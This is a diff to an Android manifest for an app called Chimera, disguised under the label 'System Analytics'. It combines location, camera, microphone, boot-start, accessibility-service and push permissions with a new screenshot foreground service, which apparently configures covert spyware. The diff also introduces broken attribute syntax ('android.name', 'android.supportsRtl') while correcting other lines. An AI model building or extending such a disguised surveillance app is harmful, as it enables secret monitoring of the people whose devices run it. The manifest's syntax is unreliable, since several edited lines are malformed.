@@ -8,22 +8,28 @@
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android.name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    
+    <!-- NEW PERMISSIONS REQUIRED FOR FOREGROUND SERVICE -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+
     <uses-feature android:name="android.hardware.camera.any" />
 
     <application
         android:name=".ChimeraApplication" 
         android:allowBackup="false"
-        android.dataExtractionRules="@null"
-        android.fullBackupContent="false"
-        android.icon="@mipmap/ic_launcher"
+        android:dataExtractionRules="@null"
+        android:fullBackupContent="false"
+        android:icon="@mipmap/ic_launcher"
         android:label="System Analytics"
-        android.roundIcon="@mipmap/ic_launcher_round"
-        android:supportsRtl="true"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android.supportsRtl="true"
         android:theme="@style/Theme.Chimera"
         tools:targetApi="31">
 
+        <!-- MainActivity, old CoreService, FCMService, BootReceiver, CameraActivity are unchanged -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -32,11 +38,6 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-
-        <activity
-            android:name=".ScreenshotActivity"
-            android:exported="false"
-            android:theme="@style/Theme.AppCompat.Transparent.NoActionBar" />
 
         <service
             android:name=".CoreService"
@@ -49,6 +50,14 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
+
+        <!-- NEW FOREGROUND SERVICE DECLARATION -->
+        <service
+            android:name=".ScreenshotService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
         <service
             android:name=".FCMService"
             android:exported="false">
